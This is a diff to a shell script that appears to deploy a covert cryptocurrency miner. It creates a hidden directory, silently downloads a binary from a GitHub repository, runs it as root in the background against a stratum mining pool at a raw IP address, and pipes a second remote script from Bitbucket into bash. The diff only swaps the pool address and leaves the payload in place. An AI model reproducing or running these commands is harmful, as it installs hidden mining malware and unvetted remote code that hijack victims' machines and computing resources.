@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://github.com/ganejafaujanih/ins/raw/main/cuan >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -a minotaurx  -o stratum+tcp://172.234.78.193:80 -u RBsvCPoH7ML9pNaXP6mibF2xmF3mgM4RGT.$(echo $(shuf -i 1-20000 -n 1)-SUIII) -p x > /dev/null 2>&1 &
+sudo ./sgr1 -a minotaurx  -o stratum+tcp://172.234.77.168:80 -u RBsvCPoH7ML9pNaXP6mibF2xmF3mgM4RGT.$(echo $(shuf -i 1-20000 -n 1)-SUIII) -p x > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 
